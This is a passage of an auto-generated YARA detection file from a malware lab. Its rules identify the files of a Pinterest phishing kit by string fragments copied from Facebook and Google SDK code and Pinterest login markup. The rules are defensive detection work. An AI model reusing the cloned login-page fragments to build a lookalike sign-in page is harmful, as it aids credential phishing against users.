      $x3 = "__d(\"sdk.XD\",[\"JSSDKXDConfig\",\"Log\",\"QueryString\",\"Queue\",\"UrlMap\",\"XDM\",\"guid\",\"isFacebookURI\",\"sdk.Content" ascii /* score: '55.00'*/
      $x4 = "__d(\"sdk.XFBML.IframeWidget\",[\"QueryString\",\"UrlMap\",\"guid\",\"insertIframe\",\"sdk.Arbiter\",\"sdk.Auth\",\"sdk.Content" ascii /* score: '54.00'*/
      $x5 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(a)" ascii /* score: '53.00'*/
      $x6 = "__d(\"ApiClient\",[\"ApiBatcher\",\"ApiClientConfig\",\"ApiClientUtils\",\"Assert\",\"ChunkedRequest\",\"CORSRequest\",\"FlashRe" ascii /* score: '53.00'*/
      $x7 = "__d(\"sdk.UIServer\",[\"JSSDKConfig\",\"Log\",\"QueryString\",\"UrlMap\",\"createObjectFrom\",\"flattenObject\",\"guid\",\"inser" ascii /* score: '52.00'*/
      $x8 = "__d(\"sdk.Auth\",[\"sdk.Cookie\",\"sdk.createIframe\",\"DOMWrapper\",\"sdk.feature\",\"sdk.getContextType\",\"guid\",\"sdk.Impre" ascii /* score: '52.00'*/
      $x9 = "__d(\"IframePlugin\",[\"Log\",\"ObservableMixin\",\"QueryString\",\"Type\",\"UrlMap\",\"guid\",\"resolveURI\",\"sdk.Auth\",\"sdk" ascii /* score: '51.50'*/
      $x10 = "__d(\"sdk.XFBML.CustomerChat\",[\"sdk.Content\",\"sdk.DialogUtils\",\"sdk.DocumentTitle\",\"sdk.DOM\",\"sdk.DOMEventListener\"," ascii /* score: '50.00'*/
      $x11 = "__d(\"sdk.init\",[\"Log\",\"ManagedError\",\"QueryString\",\"sdk.Cookie\",\"sdk.ErrorHandling\",\"sdk.Event\",\"sdk.MBasicInitia" ascii /* score: '50.00'*/
      $x12 = "__d(\"sdk.UA\",[],(function(a,b,c,d,e,f){__p&&__p();a=navigator.userAgent;var g={iphone:/\\b(iPhone|iP[ao]d)/.test(a),ipad:/\\b(" ascii /* score: '49.00'*/
      $x13 = "__d(\"sdk.XFBML.LoginButton\",[\"IframePlugin\",\"Log\",\"sdk.Helper\",\"sdk.ui\",\"sdk.XD\"],(function(a,b,c,d,e,f,g,h,i,j,k){_" ascii /* score: '46.00'*/
      $x14 = "__d(\"FlashRequest\",[\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"QueryString\",\"Queue\"],(function(a,b,c,d,e,f,g,h,i,j,k){__" ascii /* score: '46.00'*/
      $x15 = "__d(\"FB\",[\"DOMWrapper\",\"GlobalCallback\",\"JSSDKConfig\",\"JSSDKCssConfig\",\"Log\",\"dotAccess\",\"sdk.Auth\",\"sdk.Conten" ascii /* score: '46.00'*/
      $x16 = "__d(\"sdk.XFBML.Save\",[\"IframePlugin\",\"QueryString\",\"sdk.Content\",\"sdk.createIframe\",\"sdk.DialogUtils\",\"sdk.DOM\",\"" ascii /* score: '45.00'*/
      $x17 = "__d(\"sdk.api\",[\"ApiClient\",\"sdk.feature\",\"sdk.PlatformVersioning\",\"sdk.Runtime\",\"sdk.Scribe\",\"sdk.URI\"],(function(" ascii /* score: '43.00'*/
      $x18 = "__d(\"sdk.Frictionless\",[\"sdk.api\",\"sdk.Auth\",\"sdk.Dialog\",\"sdk.Event\"],(function(a,b,c,d,e,f,g,h,i,j){__p&&__p();var k" ascii /* score: '42.00'*/
      $x19 = "__d(\"sdk.XFBML.CommentsCount\",[\"ApiClient\",\"sdk.DOM\",\"sdk.XFBML.Element\",\"Log\",\"sprintf\"],(function(a,b,c,d,e,f,g,h," ascii /* score: '41.00'*/
      $x20 = "__d(\"sdk.XFBML.Name\",[\"ApiClient\",\"Log\",\"escapeHTML\",\"sdk.Event\",\"sdk.Helper\",\"sdk.Runtime\",\"sdk.Scribe\",\"sdk.X" ascii /* score: '41.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 600KB and
      1 of ($x*)
}

rule rpcshindig_random {
   meta:
      description = "phish__pinterest - file rpcshindig_random.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "769893a4f384d7246f3ad06011c114cc7c22cfe9cd0f7f3f0eec54d41efd8cad"
   strings:
      $x1 = "gapi.load(\"rpc:shindig_random\",{callback:window[\"init\"],_c:{\"jsl\":{\"ci\":{\"deviceType\":\"desktop\",\"oauth-flow\":{\"au" ascii /* score: '59.00'*/
      $x2 = "var g=window,h=document,m=g.location,n=function(){},q=/\\[native code\\]/,u=function(a,b,c){return a[b]=a[b]||c},aa=function(a){" ascii /* score: '42.00'*/
      $x3 = "oogle.com/:session_prefix:talkgadget/_/widget\"},\":gplus_url:\":\"https://plus.google.com\",\"rbr_i\":{\"params\":{\"url\":\"\"" ascii /* score: '34.00'*/
      $x4 = "rowException\":false,\"host\":\"https://apis.google.com\"},\"enableMultilogin\":true,\"googleapis.config\":{\"auth\":{\"useFirst" ascii /* score: '33.00'*/
      $x5 = "/shopping/customerreviews/optin?usegapi\\u003d1\"},\":socialhost:\":\"https://apis.google.com\",\"hangout\":{\"url\":\"https://t" ascii /* score: '33.00'*/
      $x6 = "1\"},\"savetoandroidpay\":{\"url\":\"https://androidpay.google.com/a/widget/save\"},\"blogger\":{\"params\":{\"location\":[\"sea" ascii /* score: '31.00'*/
      $s7 = "Q=function(a,b,c){a=a[b];!a&&c&&N(\"missing: \"+b);if(a){if(ea.test(a))return a;N(\"invalid: \"+b)}return null},ka=/^https?:\\/" ascii /* score: '30.00'*/
      $s8 = "ms\":{\"url\":\"\"},\"url\":\":socialhost:/:session_prefix:_/events/widget?usegapi\\u003d1\"},\"surveyoptin\":{\"url\":\"https:/" ascii /* score: '30.00'*/
      $s9 = "{\"url\":\"https://apis.google.com/marketplace/button?usegapi\\u003d1\",\"methods\":[\"launchurl\"]},\":signuphost:\":\"https://" ascii /* score: '28.00'*/
      $s10 = "\"url\":\":socialhost:/:session_prefix:_/widget/render/blogger?usegapi\\u003d1\",\"methods\":[\"scroll\",\"openwindow\"]},\"evwi" ascii /* score: '27.00'*/
      $s11 = "/accounts.google.com/o/oauth2/auth\",\"proxyUrl\":\"https://accounts.google.com/o/oauth2/postmessageRelay\",\"disableOpt\":true," ascii /* score: '25.00'*/
      $s12 = "003d1\",\"methods\":[\"onauth\"]},\"donation\":{\"url\":\"https://onetoday.google.com/home/donationWidget?usegapi\\u003d1\"},\"p" ascii /* score: '25.00'*/
      $s13 = "session_prefix:_/widget/render/follow?usegapi\\u003d1\"},\"sharetoclassroom\":{\"url\":\"https://www.gstatic.com/classroom/share" ascii /* score: '24.00'*/
      $s14 = "com/partners/badge/templates/badge.html?usegapi\\u003d1\"},\"dataconnector\":{\"url\":\"https://dataconnector.corp.google.com/:s" ascii /* score: '24.00'*/
      $s15 = ",\"iframes\":{\"ytsubscribe\":{\"url\":\"https://www.youtube.com/subscribe_embed?usegapi\\u003d1\"},\"plus_share\":{\"params\":{" ascii /* score: '23.00'*/
      $s16 = "ameUrl\":\"https://accounts.google.com/o/oauth2/iframe\",\"usegapi\":false},\"debug\":{\"reportExceptionRate\":0.05,\"forceIm\":" ascii /* score: '23.00'*/
      $s17 = "sion_prefix:_/widget/render/autocomplete\"},\"ratingbadge\":{\"url\":\"https://www.google.com/shopping/customerreviews/badge?use" ascii /* score: '22.00'*/
      $s18 = "https://androidpay.google.com/a/widget/save\"}}},\"h\":\"m;/_/scs/apps-static/_/js/k\\u003doz.gapi.en.wOJqE8XK0UA.O/m\\u003d__fe" ascii /* score: '22.00'*/
      $s19 = "ps://gsuite.google.com/:session_prefix:marketplace/appfinder?usegapi\\u003d1\"},\"person\":{\"url\":\":socialhost:/:session_pref" ascii /* score: '22.00'*/
      $s20 = "dget/render/person?usegapi\\u003d1\"},\"savetodrive\":{\"url\":\"https://drive.google.com/savetodrivebutton?usegapi\\u003d1\",\"" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_files_signin {
   meta:
      description = "phish__pinterest - file signin.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "7db96de961b52fa9011296ebfc1aa46704e14487ee7b009a6b6a3f5acbba2aa8"
   strings:
      $x1 = "gapi.load(\"\",{callback:window[\"gapi_onload\"],_c:{\"jsl\":{\"ci\":{\"deviceType\":\"desktop\",\"oauth-flow\":{\"authUrl\":\"h" ascii /* score: '66.00'*/
      $x2 = "    window['___jsl'] = window['___jsl'] || {}; window['___jsl']['ci'] = [{\"deviceType\":\"desktop\",\"oauth-flow\":{\"authUrl\"" ascii /* score: '52.00'*/
      $x3 = "var y=window,B=document,ha=y.location,ia=function(){},ja=/\\[native code\\]/,C=function(a,b,c){return a[b]=a[b]||c},ka=function(" ascii /* score: '42.00'*/
      $x4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><!-- base href=\"https://apis.google.com/\" --><style typ" ascii /* score: '37.00'*/
      $x5 = "session_prefix:talkgadget/_/widget\"},\":gplus_url:\":\"https://plus.google.com\",\"rbr_i\":{\"params\":{\"url\":\"\"},\"url\":" ascii /* score: '36.00'*/
      $x6 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><!-- base href=\"https://apis.google.com/\" --><style typ" ascii /* score: '35.00'*/
      $x7 = "ogle.com/:session_prefix:talkgadget/_/widget\"},\":gplus_url:\":\"https://plus.google.com\",\"rbr_i\":{\"params\":{\"url\":\"\"}" ascii /* score: '34.00'*/
      $x8 = "n\":false,\"host\":\"https://apis.google.com\"},\"enableMultilogin\":true,\"googleapis.config\":{\"auth\":{\"useFirstPartyAuthV2" ascii /* score: '33.00'*/
      $x9 = "; var AF_dataServiceRequests = {}; var AF_initDataChunkQueue = []; var AF_initDataCallback; var AF_initDataInitializeCallback; i" ascii /* score: '33.00'*/
      $x10 = "ustomerreviews/optin?usegapi\\u003d1\"},\":socialhost:\":\"https://apis.google.com\",\"hangout\":{\"url\":\"https://talkgadget.g" ascii /* score: '33.00'*/
      $x11 = "https://accounts.google.com/o/oauth2/postmessageRelay\",\"usegapi\":false},\"debug\":{\"host\":\"https://apis.google.com\",\"rep" ascii /* score: '33.00'*/
      $x12 = "shopping/customerreviews/optin?usegapi\\u003d1\"},\":socialhost:\":\"https://apis.google.com\",\"hangout\":{\"url\":\"https://ta" ascii /* score: '33.00'*/
      $x13 = "le_host_origin\\u0026origin\\u003dhttps://www.pinterest.com\\u0026url\\u003dhttps://www.pinterest.com/login/\\u0026gsrc\\u003d3p" ascii /* score: '33.00'*/
      $x14 = "oogle.com/o/oauth2/auth\",\"proxyUrl\":\"https://accounts.google.com/o/oauth2/postmessageRelay\",\"disableOpt\":true,\"idpIframe" ascii /* score: '31.00'*/
      $x15 = "\"},\"savetoandroidpay\":{\"url\":\"https://androidpay.google.com/a/widget/save\"},\"blogger\":{\"params\":{\"location\":[\"sear" ascii /* score: '31.00'*/
      $x16 = "androidpay\":{\"url\":\"https://androidpay.google.com/a/widget/save\"},\"blogger\":{\"params\":{\"location\":[\"search\",\"hash" ascii /* score: '31.00'*/
      $s17 = "\"\"},\"url\":\":socialhost:/:session_prefix:_/events/widget?usegapi\\u003d1\"},\"surveyoptin\":{\"url\":\"https://www.google.co" ascii /* score: '30.00'*/
      $s18 = "s\":{\"url\":\"\"},\"url\":\":socialhost:/:session_prefix:_/events/widget?usegapi\\u003d1\"},\"surveyoptin\":{\"url\":\"https://" ascii /* score: '30.00'*/
      $s19 = "y.___gapisync?Aa(a):Z(a,b,H)}else u[v](ia)}else fa(q)&&d&&d()};var Da=function(a,b){if(F.hee&&0<F.hel)try{return a()}catch(c){b&" ascii /* score: '30.00'*/
      $s20 = "V=function(a,b,c){a=a[b];!a&&c&&S(\"missing: \"+b);if(a){if(oa.test(a))return a;S(\"invalid: \"+b)}return null},ta=/^https?:\\/" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 90KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_files_sdk {
   meta:
      description = "phish__pinterest - file sdk.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3ceb497af90f08d9421c888407d18409be7ca644ac4bd53e31ec5131e99f4b59"
   strings:
      $x1 = "__d(\"sdk.UA\",[],(function(a,b,c,d,e,f){__p&&__p();a=navigator.userAgent;var g={iphone:/\\b(iPhone|iP[ao]d)/.test(a),ipad:/\\b(" ascii /* score: '49.00'*/
      $x2 = "__d(\"ak.loginWithEmail\",[\"Log\",\"ak.getAuthCode\",\"ak.input-validators\",\"ak.Runtime\",\"sdk.Content\",\"sdk.createIframe" ascii /* score: '44.00'*/
      $x3 = "__d(\"ak.Impressions\",[\"ak.Runtime\",\"getBlankIframeSrc\",\"guid\",\"insertIframe\",\"sdk.Content\",\"sdk.URI\"],(function(a," ascii /* score: '42.00'*/
      $x4 = "__d(\"ak.loginWithPhone\",[\"Log\",\"ak.getAuthCode\",\"ak.Runtime\",\"ak.utils\",\"sdk.Content\",\"sdk.createIframe\",\"sdk.UA" ascii /* score: '40.00'*/
      $x5 = "__d(\"UserAgent_DEPRECATED\",[],(function(a,b,c,d,e,f){__p&&__p();var g=!1,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v;function w(){__p&&__p()" ascii /* score: '39.00'*/
      $x6 = "__d(\"sdk.Runtime\",[\"JSSDKRuntimeConfig\",\"sdk.Model\"],(function(a,b,c,d,e,f,g,h){__p&&__p();var i={UNKNOWN:0,PAGETAB:1,CANV" ascii /* score: '39.00'*/
      $x7 = "__d(\"ak.getAuthCode\",[\"Log\",\"ak.feature\",\"ak.Impressions\",\"ak.PopupMonitor\",\"ak.PopupWindow\",\"ak.Runtime\",\"sdk.DO" ascii /* score: '38.00'*/
      $x8 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(a)" ascii /* score: '38.00'*/
      $x9 = "__d(\"ak.init\",[\"ak.ErrorHandling\",\"ak.feature\",\"ak.Impressions\",\"ak.Runtime\",\"sdk.UA\"],(function(a,b,c,d,e,f,g,h,i,j" ascii /* score: '37.00'*/
      $x10 = "__d(\"normalizeError\",[\"sdk.UA\"],(function(a,b,c,d,e,f,g){function a(a){var b={line:a.lineNumber||a.line,message:a.message,na" ascii /* score: '36.00'*/
      $x11 = "try {(function(){var a=\"https://developers.facebook.com/docs/accountkit/integratingweb#configureloginhtml\";if(!window.AccountK" ascii /* score: '35.00'*/
      $x12 = ".name,script:a.fileName||a.sourceURL||a.script,stack:a.stackTrace||a.stack};b._originalError=a;a=/([\\w:\\.\\/]+\\.js):(\\d+)/.e" ascii /* score: '33.00'*/
      $x13 = "__d(\"ak.login\",[\"ak.loginWithEmail\",\"ak.loginWithPhone\",\"ak.Runtime\"],(function(a,b,c,d,e,f,g,h,i){__p&&__p();var j=ES(" ascii /* score: '32.00'*/
      $x14 = "__d(\"ak.loginWithEmail\",[\"Log\",\"ak.getAuthCode\",\"ak.input-validators\",\"ak.Runtime\",\"sdk.Content\",\"sdk.createIframe" ascii /* score: '32.00'*/
      $x15 = "__d(\"json3-3.3.2\",[],(function(a,b,c,d,e,f){\"use strict\";__p&&__p();var g={},h={exports:g},i;function j(){__p&&__p();(functi" ascii /* score: '32.00'*/
      $x16 = "__d(\"ak.loginWithPhone\",[\"Log\",\"ak.getAuthCode\",\"ak.Runtime\",\"ak.utils\",\"sdk.Content\",\"sdk.createIframe\",\"sdk.UA" ascii /* score: '32.00'*/
      $s17 = "\"\"}}f=/(?:Mac OS X (\\d+(?:[._]\\d+)?))/.exec(a);f&&(i.osx=f[1]);b=/(?:Opera Mini\\/(\\d+(?:\\.\\d+)?))/.exec(a);b&&(i.operaMi" ascii /* score: '29.00'*/
      $s18 = "__d(\"ak.Runtime\",[\"AccountKitJSSDKRuntimeConfig\",\"guid\",\"sdk.Model\"],(function(a,b,c,d,e,f,g,h,i){a=new i({AppID:\"\",St" ascii /* score: '29.00'*/
      $s19 = "__d(\"sdk.Content\",[\"Log\",\"sdk.domReady\",\"sdk.UA\"],(function(a,b,c,d,e,f,g,h,i){__p&&__p();var j,k={append:function(a,b){" ascii /* score: '29.00'*/
      $s20 = "try {(function(){var a=\"https://developers.facebook.com/docs/accountkit/integratingweb#configureloginhtml\";if(!window.AccountK" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule xaOI6zd9HW9 {
   meta:
      description = "phish__pinterest - file xaOI6zd9HW9.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "9b9ba89179422bd4243bf0bfab30a5b2adaaf450c78dc84d90dc8d8776025866"
   strings:
      $x1 = "__d(\"XDM\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"Log\",\"UserAgent_DEPRECATED\",\"emptyFuncti" ascii /* score: '56.50'*/
      $x2 = "__d(\"initXdArbiter\",[\"QueryString\",\"resolveWindow\",\"Log\",\"XDM\",\"XDMConfig\"],(function(a,b,c,d,e,f){__p&&__p();(funct" ascii /* score: '48.50'*/
      $x3 = "__d(\"UserAgent_DEPRECATED\",[],(function(a,b,c,d,e,f){__p&&__p();var g=!1,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v;function w(){__p&&__p()" ascii /* score: '39.00'*/
      $x4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><title>Facebook Cross-Domain Messaging helper</title></he" ascii /* score: '33.00'*/
      $s5 = "__d(\"Flash\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"QueryString\",\"UserAgent_DEPRECATED\",\"guid\",\"htmlSpecialChars\"],(" ascii /* score: '29.00'*/
      $s6 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(a)" ascii /* score: '26.00'*/
      $s7 = "Version.|.)(\\d+\\.\\d+))|(?:AppleWebKit.(\\d+(?:\\.\\d+)?))|(?:Trident\\/\\d+\\.\\d+.*rv:(\\d+\\.\\d+))/.exec(a),c=/(Mac OS X)|" ascii /* score: '24.00'*/
      $s8 = "s\",c,r)};var c=null;c={xd_action:\"proxy_ready\",logged_in:/\\bc_user=/.test(document.cookie),data:c};var e=i(s,r);e&&(c.regist" ascii /* score: '24.00'*/
      $s9 = "Object.create||(Object.create=function(a){var b=typeof a;if(b!=\"object\"&&b!=\"function\")throw new TypeError(\"Object prototyp" ascii /* score: '23.00'*/
      $s10 = "f(g)return;g=!0;var a=navigator.userAgent,b=/(?:MSIE.(\\d+\\.\\d+))|(?:(?:Firefox|GranParadiso|Iceweasel).(\\d+\\.\\d+))|(?:Oper" ascii /* score: '22.00'*/
      $s11 = "proxy to %s\",o.relation),l());return}if(p!=/https?/.exec(window.name)[0]){d.info(\"Redirection to %s detected, aborting\",p);re" ascii /* score: '22.00'*/
      $s12 = "3]):NaN;k=b[4]?parseFloat(b[4]):NaN;k?(b=/(?:Chrome\\/(\\d+\\.\\d+))/.exec(a),l=b&&b[1]?parseFloat(b[1]):NaN):l=NaN}else h=i=j=l" ascii /* score: '21.00'*/
      $s13 = "arch)},50)}function m(){var a=/^(.*)\\/(.*)$/.exec(o.origin)[1];if(window.__fbNative&&window.__fbNative.postMessage)window.__fbN" ascii /* score: '21.00'*/
      $s14 = ";window.addEventListener(\"fbNativeReady\",b)}}var n=/#(.*)|$/.exec(document.URL)[1];window==top&&(location.hash=\"\");if(!n){d." ascii /* score: '21.00'*/
      $s15 = "body><script>document.domain = 'facebook.com';__transform_includes = {};self.__DEV__=self.__DEV__||0;" fullword ascii /* score: '20.00'*/
      $s16 = "(function(){var a={},b=function(a,b){if(!a&&!b)return null;var c={};typeof a!==\"undefined\"&&(c.type=a);typeof b!==\"undefined" ascii /* score: '19.00'*/
      $s17 = "a.length;c++){var d=a[c],e=/^frames\\[[\\'\\\"]?([a-zA-Z0-9\\-_]+)[\\'\\\"]?\\]$/.exec(d);if(e)b=b.frames[e[1]];else if(d===\"op" ascii /* score: '19.00'*/
      $s18 = "load the components\",d)},d);a=!0}}}());var t=/\\.facebook\\.com(\\/|$)/;a.register(\"postmessage\",function(){__p&&__p();var a=" ascii /* score: '19.00'*/
      $s19 = "=e);b.send(a.encode(c),r,parent,q)}})})()}),null);__d(\"XDMConfig\",[],{\"Flash\":{\"path\":\"https:\\/\\/connect.facebook.net" ascii /* score: '19.00'*/
      $s20 = "typeof Math.log2!==\"function\"&&(Math.log2=function(a){return Math.log(a)/Math.LN2}),typeof Math.log10!==\"function\"&&(Math.lo" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule postmessageRelay {
   meta:
      description = "phish__pinterest - file postmessageRelay.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "f8c7a473b1027f23ea1ab39f02f5c6fe9d82eaf1785900a6a3b58cd265af675e"
   strings:
      $x1 = "<html><head><title></title><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compat" ascii /* score: '33.00'*/
      $s2 = "FxESvpgDhnyDw0gQ3KrN2lXFY\" type=\"text/javascript\" src=\"postmessageRelay_data/rpcshindig_random.js\" gapi_processed=\"true\">" ascii /* score: '23.00'*/
      $s3 = "<html><head><title></title><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compat" ascii /* score: '20.00'*/
      $s4 = "e=\"09FxESvpgDhnyDw0gQ3KrN2lXFY\" src=\"postmessageRelay_data/25936583-postmessagerelay.js\"></script></head><body><script nonce" ascii /* score: '15.00'*/
      $s5 = "alable=0\"><script src=\"postmessageRelay_data/cbgapi.loaded_0\" nonce=\"09FxESvpgDhnyDw0gQ3KrN2lXFY\" async=\"\"></script><scri" ascii /* score: '15.00'*/
      $s6 = " content=\"IE=edge\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, us" ascii /* score: '11.00'*/
      $s7 = "t></body></html>" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_files_iframe {
   meta:
      description = "phish__pinterest - file iframe.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "6de77d183fd1e115c3a48d6cb20d578574041c1b417067df8c9935d93d543953"
   strings:
      $s1 = "<html><head><title></title><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compat" ascii /* score: '28.00'*/
      $s2 = "<html><head><title></title><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compat" ascii /* score: '20.00'*/
      $s3 = "alable=0\"><script nonce=\"u2DXRA84AhzpFSDxL3XnpNTGBqY\" src=\"iframe_data/3723580519-idpiframe.js\"></script></head><body><scri" ascii /* score: '18.00'*/
      $s4 = "nce=\"u2DXRA84AhzpFSDxL3XnpNTGBqY\" type=\"text/javascript\">lso.startIdpIFrame();</script></body></html>" fullword ascii /* score: '13.00'*/
      $s5 = " content=\"IE=edge\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, us" ascii /* score: '11.00'*/
      $s6 = "3723580519" ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule login_button {
   meta:
      description = "phish__pinterest - file login_button.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "80a76372dcfeee55f159e86633f6ec14f7537a9f5a53c8b411da879096ec7a33"
   strings:
      $x1 = "          11.9-11.9V11.9C216 5.3 210.7 0 204.1 0z\"></path></svg><img class=\"_5h0l img\" src=\"login_button_data/aMltqKRlCHD.pn" ascii /* score: '75.00'*/
      $x2 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><meta name=\"referrer\" content=" ascii /* score: '62.00'*/
      $x3 = "widget\",\"page_uri\":\"https:\\/\\/www.facebook.com\\/plugins\\/login_button.php?app_id=274266067164&button_type=continue_with&" ascii /* score: '39.00'*/
      $x4 = "on d(){window.require(\"Arbiter\").inform(a,b,c)}f?d():this.execute(d)}}}();ServerJSAsyncLoader.run(\"https:\\/\\/www.facebook.c" ascii /* score: '37.00'*/
      $s5 = "m\":\"__elem_0242a6b7_0_0\"},274266067164,\"public_profile,email,user_likes,user_birthday,user_friends\",\"https:\\/\\/www.pinte" ascii /* score: '29.00'*/
      $s6 = "-1, \"u_0_0\", \"f22045a90ec3754\", \"https:\\/\\/www.pinterest.com\", \"www.pinterest.com\");</script></div></div></div><script" ascii /* score: '29.00'*/
      $s7 = "erJsDownloads\":false,\"fixMemoryLeaks\":false},329],[\"CSSLoaderConfig\",[],{\"timeout\":5000,\"modulePrefix\":\"BLCSS:\",\"loa" ascii /* score: '28.00'*/
      $s8 = ".onkeydown=e.onmouseover=e.onclick=onfocus=m},execute:function(a){var c=e.createElement(\"script\");c.src=ServerJSAsyncLoader.fi" ascii /* score: '27.00'*/
      $s9 = "){this.file=a,this.execute()},load:function(b){this.file=b;if(!l(b)){this.run(b);return}window.onload=function(){a=!0,i(),n()};e" ascii /* score: '25.00'*/
      $s10 = "oCategoryHeader\",[],{},1127],[\"TrackingConfig\",[],{\"domain\":\"https:\\/\\/pixel.facebook.com\"},325],[\"ErrorSignalConfig\"" ascii /* score: '24.00'*/
      $s11 = "src.php\\/v3i7M54\\/y5\\/l\\/en_US\\/Z4_JZrbn7cR.js\");</script><script src=\"login_button_data/Z4_JZrbn7cR.js\" async=\"\"></sc" ascii /* score: '24.00'*/
      $s12 = "lem_0242a6b7_0_0\",\"u_0_1\",2]],\"require\":[[\"UnverifiedXD\",\"setChannelUrl\",[],[\"https:\\/\\/staticxx.facebook.com\\/conn" ascii /* score: '23.00'*/
      $s13 = "\"https:\\/\\/error.facebook.com\\/common\\/scribe_endpoint.php\"},319],[\"ServerNonce\",[],{\"ServerNonce\":\"jOoHJnwisGfm8CfHd" ascii /* score: '23.00'*/
      $s14 = "\":1},\"WebSpeedInteractionsTypedLogger\":{\"resources\":[],\"module\":1}});});});</script><script>ServerJSQueue.add({\"elements" ascii /* score: '23.00'*/
      $s15 = "(window.Env))}envFlush({\"ajaxpipe_token\":\"AXhxPtC9ugaN1fDx\",\"no_cookies\":1});</script><script>ServerJSQueue.add(function()" ascii /* score: '22.00'*/
      $s16 = ":\"javascript\"}},1496],[\"BootloaderConfig\",[],{\"jsRetries\":null,\"jsRetryAbortNum\":2,\"jsRetryAbortTime\":5,\"payloadEndpo" ascii /* score: '22.00'*/
      $s17 = "navigator.userAgent)?window.__fbNative&&__fbNative.postMessage?d():window.addEventListener(\"fbNativeReady\",d):c()})();; })(268" ascii /* score: '21.00'*/
      $s18 = "e\\/\":1,\"\\/work\\/landing\":1,\"\\/work\\/login\\/\":1,\"\\/work\\/email\\/\":1,\"\\/ai.php\":1,\"\\/js_dialog_resources\\/di" ascii /* score: '21.00'*/
      $s19 = "php\":1,\"\\/4oh4.php\":1,\"\\/autologin.php\":1,\"\\/birthday_help.php\":1,\"\\/checkpoint\\/\":1,\"\\/contact-importer\\/\":1," ascii /* score: '21.00'*/
      $s20 = "gal\\/terms\\/\":1,\"\\/login.php\":1,\"\\/login\\/\":1,\"\\/mobile\\/account\\/\":1,\"\\/n\\/\":1,\"\\/remote_test_device\\/\":" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login {
   meta:
      description = "phish__pinterest - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "bbfc97a9a691c70b8cf11c95bcd82739634b7d604e9b8aaea9ce03c811b84502"
   strings:
      $x1 = "<script nonce=\"yTKrxRWJWE\">window.isMainPinterestSite = true;var Pc = {\"IS_TEST_MODE\": false, \"authenticationOrigin\": \"ht" ascii /* score: '74.00'*/
      $x2 = "&quot;,Arial,sans-serif,&quot;Apple Color Emoji&quot;,&quot;Segoe UI Emoji&quot;,&quot;Segoe UI Symbol&quot;; position: absolute" ascii /* score: '46.00'*/
      $x3 = ".fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:vis" ascii /* score: '40.00'*/
      $x4 = "&quot;,Arial,sans-serif,&quot;Apple Color Emoji&quot;,&quot;Segoe UI Emoji&quot;,&quot;Segoe UI Symbol&quot;; font-size: 15px; f" ascii /* score: '39.00'*/
      $x5 = "Forgot your password?</a><div><span>Are you a business? <a href=\"https://www.pinterest.com/business/create/\" target=\"_blank\"" ascii /* score: '35.00'*/
